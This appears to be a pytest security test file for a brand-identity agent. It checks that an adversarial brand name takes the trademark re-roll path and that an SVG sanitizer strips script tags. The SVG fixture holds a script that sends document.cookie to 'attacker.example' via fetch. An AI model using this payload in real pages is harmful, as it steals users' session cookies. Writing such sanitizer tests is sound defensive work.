"""Brand-identity prompt-injection: malicious names + SVG payloads must be defended."""
from __future__ import annotations

import pytest

pytestmark = [pytest.mark.security, pytest.mark.asyncio]


async def test_brand_with_uspto_conflict_promotes_alternative(monkeypatch, mock_gemini) -> None:
    """Adversarial brand name with USPTO conflict triggers re-roll path."""
    from agents.brand_identity_agent import brand_identity_agent
    from models.session_models import AgentStatusValue
    from services import domain_service, gemini_client, trademark_service
    from tests.conftest import _default_for_schema
    from tests.test_agents._helpers import populated_state

    payload = dict(_default_for_schema("BrandIdentityResult"))
    payload["company_name"] = "EVIL_CORP"
    payload["name_alternatives"] = [{"name": "Cleanly", "rationale": "alt"}]

    async def _call(*, model, prompt, response_schema, grounded=False, temperature=0.4):
        return payload, 100, 100, False

    async def _uspto(name: str):
        return {"conflicts": ["EVIL_CORP LLC"]} if name == "EVIL_CORP" else {"conflicts": []}

    async def _domain(name: str):
        return {"com_available": True, "handle_x_available": True, "handle_instagram_available": True}

    monkeypatch.setattr(gemini_client, "call_gemini_structured", _call, raising=False)
    monkeypatch.setattr(trademark_service, "check_uspto", _uspto, raising=False)
    monkeypatch.setattr(domain_service, "check_domain_availability", _domain, raising=False)

    state = populated_state()
    result = await brand_identity_agent.run(state)
    assert result.status == AgentStatusValue.COMPLETED
    # Either alternative promoted, or primary kept (if rerolls failed). Either way, cohesive.
    assert result.output is not None


async def test_logo_svg_sanitized() -> None:
    """If the agent emits a logo_svg_sanitized field, sanitize_svg must strip <script>."""
    from services.sanitization import sanitize_svg

    bad = (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<script>fetch("https://attacker.example?c="+document.cookie)</script>'
        '<circle cx="50" cy="50" r="40"/>'
        '</svg>'
    )
    cleaned = sanitize_svg(bad).lower()
    assert "<script" not in cleaned
    assert "attacker.example" not in cleaned or "javascript:" not in cleaned
